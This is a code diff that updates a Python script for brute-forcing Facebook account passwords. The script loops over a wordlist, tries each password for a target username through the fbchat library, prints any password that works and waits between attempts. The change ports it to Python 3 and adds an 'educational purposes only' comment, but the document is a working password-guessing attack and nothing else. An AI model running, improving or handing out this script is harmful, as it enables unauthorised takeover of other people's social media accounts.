@@ -1,4 +1,4 @@
-from fbchat import *
+from fbchat import Client
 from time import sleep
 from sys import exit
 
@@ -7,14 +7,16 @@ R = '\033[31m'  # red
 G = '\033[32m'  # green
 O = '\033[33m'  # orange
 
-def facebookBruteforce(username, wordlist, delay):
-    wordlist = open(wordlist, 'r')
-    for i in wordlist.readlines():
-        password = i.strip("\n")
-        try:
-            client = Client(str(username), password)
-            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
-            exit()
-        except:
-             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-             sleep(delay)
+def facebook_bruteforce(username, wordlist, delay):
+    with open(wordlist, 'r') as wl:
+        for line in wl:
+            password = line.strip()
+            try:
+                client = Client(username, password)
+                print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
+                exit()
+            except Exception as e:
+                print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!\n{W}")
+                sleep(delay)
+
+# Note: This script is for educational purposes only.
